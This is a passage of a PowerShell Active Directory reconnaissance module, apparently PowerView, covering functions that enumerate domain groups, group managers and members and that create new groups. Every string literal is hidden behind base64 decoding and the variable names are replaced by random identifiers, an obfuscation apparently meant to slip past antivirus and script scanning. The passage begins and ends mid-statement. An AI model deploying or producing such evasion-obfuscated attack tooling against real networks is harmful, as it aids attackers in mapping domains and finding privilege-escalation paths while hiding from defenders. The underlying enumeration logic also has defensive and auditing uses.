BuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHMAYwBvAHAAZQAgACcAJAB7ADkANQA3AD
MAMwA1ADgAMQBkADUAYwA5ADQANwA2ADAAYgA0ADAANQAxAGMAOQA2AGIAZgAxADAANw
BmADIANQB9ACcA')))
                }
                if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RwByAG8AdQBwAFAAcgBvAHAAZQByAHQAeQA=')))]) {
                    
${fecdda6bc59b42698923708b2ffe7617} = $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAFAAcgBvAHAAZQByAHQAeQA=')))]
                    
$Filter = Switch (${fecdda6bc59b42698923708b2ffe7617}) {
             
           $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AA==')))           
   { $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANg
AuADEALgA0AC4AOAAwADMAOgA9ADIAMQA0ADcANAA4ADMANgA0ADgAKQA='))) }
     
                   $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABpAHMAdAByAGkAYgB1AHQAaQBvAG4A')))   
       { $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQ
A1ADYALgAxAC4ANAAuADgAMAAzADoAPQAyADEANAA3ADQAOAAzADYANAA4ACkAKQA=')
)) }
                        $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwByAGUAYQB0AGUAZABCAHkAUwB5AHMAdABlAG0A')))       { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANg
AuADEALgA0AC4AOAAwADMAOgA9ADEAKQA='))) }
                        
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBvAHQAQwByAGUAYQB0AGUAZABCAHkAUwB5AHMAdABlAG0A')))    { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQ
A1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxACkAKQA='))) }
                    
}
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQ
BuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHAAcgBvAHAAZQByAHQAeQAgACcAJAB7AG
YAZQBjAGQAZABhADYAYgBjADUAOQBiADQAMgA2ADkAOAA5ADIAMwA3ADAAOABiADIAZg
BmAGUANwA2ADEANwB9ACcA')))
                }
                if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
   
                 Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAVQBzAGkAbgBnACAAYQ
BkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAE
QAQQBQAEYAaQBsAHQAZQByAA==')))
                    $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                }
              
  ${342e0841e72a4d5b89eb7b6029624511}.filter = 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAJA
BGAGkAbAB0AGUAcgApAA==')))
                Write-Verbose "[Get-
DomainGroup] filter string: 
$(${342e0841e72a4d5b89eb7b6029624511}.filter)"
                if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { 
${9f78951ba80c437e9db41515f07bc24e} = 
${342e0841e72a4d5b89eb7b6029624511}.FindOne() }
                else 
{ ${9f78951ba80c437e9db41515f07bc24e} = 
${342e0841e72a4d5b89eb7b6029624511}.FindAll() }
                
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA')))]) {
                        
${b5a50316dca4465cad6cfeb0e116447c} = $_
                    }
        
            else {
                        
${b5a50316dca4465cad6cfeb0e116447c} = Convert-LDAPProperty -
Properties $_.Properties
                    }
                    
${b5a50316dca4465cad6cfeb0e116447c}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAA'))))
                    
${b5a50316dca4465cad6cfeb0e116447c}
                }
                
if (${9f78951ba80c437e9db41515f07bc24e}) {
                    try { 
${9f78951ba80c437e9db41515f07bc24e}.dispose() }
                    
catch {
                        Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQByAHIAbwByACAAZA
BpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAG
IAagBlAGMAdAA=')))
                    }
                }
             
   ${342e0841e72a4d5b89eb7b6029624511}.dispose()
            }
        
}
    }
}
function New-DomainGroup {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseShouldProcessForStateChangingFunctions', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
    
    [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
   
     [String]
        $SamAccountName,
        
[ValidateNotNullOrEmpty()]
        [String]
        $Name,
        
[ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,
      
  [ValidateNotNullOrEmpty()]
        [String]
        $Description,
    
    [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
       
 [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    
${432399043cb74015939f7ede4d948e76} = @{
        'Identity' = 
$SamAccountName
    }
    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${432399043cb74015939f7ede4d948e76}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${432399043cb74015939f7ede4d948e76}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    
${a2937286b06c4978969ea53dafc8c4d6} = Get-PrincipalContext 
@432399043cb74015939f7ede4d948e76
    if 
(${a2937286b06c4978969ea53dafc8c4d6}) {
        
${b5a50316dca4465cad6cfeb0e116447c} = New-Object -TypeName 
System.DirectoryServices.AccountManagement.GroupPrincipal -
ArgumentList (${a2937286b06c4978969ea53dafc8c4d6}.Context)
        
${b5a50316dca4465cad6cfeb0e116447c}.SamAccountName = 
${a2937286b06c4978969ea53dafc8c4d6}.Identity
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TgBhAG0AZQA=')))]) {
            
${b5a50316dca4465cad6cfeb0e116447c}.Name = $Name
        }
        
else {
            ${b5a50316dca4465cad6cfeb0e116447c}.Name = 
${a2937286b06c4978969ea53dafc8c4d6}.Identity
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAA==')))]) 
{
            ${b5a50316dca4465cad6cfeb0e116447c}.DisplayName = 
$DisplayName
        }
        else {
            
${b5a50316dca4465cad6cfeb0e116447c}.DisplayName = 
${a2937286b06c4978969ea53dafc8c4d6}.Identity
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))]) 
{
            ${b5a50316dca4465cad6cfeb0e116447c}.Description = 
$Description
        }
        Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAQQB0AHQAZQBtAHAAdA
BpAG4AZwAgAHQAbwAgAGMAcgBlAGEAdABlACAAZwByAG8AdQBwACAAJwAkAFMAYQBtAE
EAYwBjAG8AdQBuAHQATgBhAG0AZQAnAA==')))
        try {
            $Null 
= ${b5a50316dca4465cad6cfeb0e116447c}.Save()
            Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARwByAG8AdQBwACAAJw
AkAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAnACAAcwB1AGMAYwBlAHMAcwBmAH
UAbABsAHkAIABjAHIAZQBhAHQAZQBkAA==')))
            
${b5a50316dca4465cad6cfeb0e116447c}
        }
        catch {
          
  Write-Warning $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQByAHIAbwByACAAYw
ByAGUAYQB0AGkAbgBnACAAZwByAG8AdQBwACAAJwAkAFMAYQBtAEEAYwBjAG8AdQBuAH
QATgBhAG0AZQAnACAAOgAgACQAXwA=')))
        }
    }
}
function Get-
DomainManagedSecurityGroup {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
   
     [Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
     
   [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        
[ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        
[String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
       
 [Alias('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        
$Tombstone,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${ea43c787582f45539b7f519da4680c7a} = @{
            'LDAPFilter' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAmACgAbQBhAG4AYQBnAGUAZABCAHkAPQAqACkAKABnAHIAbwB1AHAAVAB5AHAAZQ
A6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9AD
IAMQA0ADcANAA4ADMANgA0ADgAKQApAA==')))
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlACwAbQBhAG4AYQBnAGUAZA
BCAHkALABzAGEAbQBhAGMAYwBvAHUAbgB0AHQAeQBwAGUALABzAGEAbQBhAGMAYwBvAH
UAbgB0AG4AYQBtAGUA')))
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS 
{
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) {
            
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain
            $TargetDomain = 
$Domain
        }
        else {
            $TargetDomain = 
$Env:USERDNSDOMAIN
        }
        Get-DomainGroup 
@ea43c787582f45539b7f519da4680c7a | ForEach-Object {
            
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbgBhAG0AZQAsAHMAYQ
BtAGEAYwBjAG8AdQBuAHQAdAB5AHAAZQAsAHMAYQBtAGEAYwBjAG8AdQBuAHQAbgBhAG
0AZQAsAG8AYgBqAGUAYwB0AHMAaQBkAA==')))
            
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $_.managedBy
            $Null = 
${ea43c787582f45539b7f519da4680c7a}.Remove
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA='))))
            
${5f46b6b1dcc34f28850d8a52d666a605} = Get-DomainObject 
@ea43c787582f45539b7f519da4680c7a
            
${6181844ab5974fe78c60d6f151feec3b} = New-Object PSObject
            
${6181844ab5974fe78c60d6f151feec3b} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAE4AYQBtAGUA'))) $_.samaccountname
            
${6181844ab5974fe78c60d6f151feec3b} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) 
$_.distinguishedname
            ${6181844ab5974fe78c60d6f151feec3b} 
| Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBOAGEAbQBlAA=='))) 
${5f46b6b1dcc34f28850d8a52d666a605}.samaccountname
            
${6181844ab5974fe78c60d6f151feec3b} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBhAG4AYQBnAGUAcgBEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUA')
)) ${5f46b6b1dcc34f28850d8a52d666a605}.distinguishedName
            
if (${5f46b6b1dcc34f28850d8a52d666a605}.samaccounttype -eq 
0x10000000) {
                ${6181844ab5974fe78c60d6f151feec3b} | 
Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBUAHkAcABlAA=='))) 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAA==')))
            }
            elseif 
(${5f46b6b1dcc34f28850d8a52d666a605}.samaccounttype -eq 0x30000000) 
{
                ${6181844ab5974fe78c60d6f151feec3b} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBUAHkAcABlAA=='))) 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgA=')))
            }
            
${1063fd71be6347a0b04981bec0366176} = @{
                'Identity' = 
$_.distinguishedname
                'RightsFilter' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA')))
            }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) 
{ ${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
          if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${1063fd71be6347a0b04981bec0366176}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            
${6181844ab5974fe78c60d6f151feec3b} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBhAG4AYQBnAGUAcgBDAGEAbgBXAHIAaQB0AGUA'))) 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBOAEsATgBPAFcATgA=')))
            
${6181844ab5974fe78c60d6f151feec3b}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBNAGEAbgBhAGcAZQBkAFMAZQBjAHUAcgBpAHQAeQ
BHAHIAbwB1AHAA'))))
            ${6181844ab5974fe78c60d6f151feec3b}
   
     }
    }
}
function Get-DomainGroupMember {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType
('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName 
= 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = 
$True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 
'MemberDistinguishedName', 'MemberName')]
        [String[]]
        
$Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        
$Domain,
        [Parameter(ParameterSetName = 'ManualRecurse')]
      
  [Switch]
        $Recurse,
        [Parameter(ParameterSetName = 
'RecurseUsingMatchingRule')]
        [Switch]
        
$RecurseUsingMatchingRule,
        [ValidateNotNullOrEmpty()]
        
[Alias('Filter')]
        [String]
        $LDAPFilter,
        
[ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        
[String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
       
 [Alias('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet
('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        
$SecurityMasks,
        [Switch]
        $Tombstone,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${ea43c787582f45539b7f519da4680c7a} = @{
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBlAG0AYgBlAHIALABzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUALABkAGkAcw
B0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUA')))
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${e95ff9a0cfb548dba5f1385fe67fc468} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${e95ff9a0cfb548dba5f1385fe67fc468}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))]) { ${e95ff9a0cfb548dba5f1385fe67fc468}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${e95ff9a0cfb548dba5f1385fe67fc468}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS 
{
        ${342e0841e72a4d5b89eb7b6029624511} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
        if 
(${342e0841e72a4d5b89eb7b6029624511}) {
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAGMAdQByAHMAZQBVAHMAaQBuAGcATQBhAHQAYwBoAGkAbgBnAFIAdQBsAGUA')
))]) {
                ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity
                
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA')))] = $True
                
${b5a50316dca4465cad6cfeb0e116447c} = Get-DomainGroup 
@ea43c787582f45539b7f519da4680c7a
                if (-not 
${b5a50316dca4465cad6cfeb0e116447c}) {
                    Write-
Warning $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQ
ByAHIAbwByACAAcwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAH
cAaQB0AGgAIABpAGQAZQBuAHQAaQB0AHkAOgAgACQASQBkAGUAbgB0AGkAdAB5AA==')
))
                }
                else {
                    
${00499a3772104a55a5e44fc15c3e9436} = 
${b5a50316dca4465cad6cfeb0e116447c}.properties.item
